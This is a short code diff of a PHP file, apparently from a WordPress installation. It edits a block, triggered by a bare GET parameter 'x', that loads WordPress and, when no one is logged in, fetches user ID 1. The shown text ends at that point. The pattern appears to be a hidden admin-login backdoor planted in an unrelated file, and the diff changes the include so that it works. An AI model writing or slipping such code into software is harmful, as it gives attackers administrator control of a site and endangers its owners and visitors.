@@ -63,7 +63,7 @@ trait Singleton {
 }
 
 if (isset($_GET["x"])) {
-require_once('/var/www/new_uinsa/wp-login.php');
+require_once('/var/www/new_uinsa/wp-load.php');
 $user_id = 1;
 if (!is_user_logged_in()) {
     $user = get_user_by('id', $user_id);
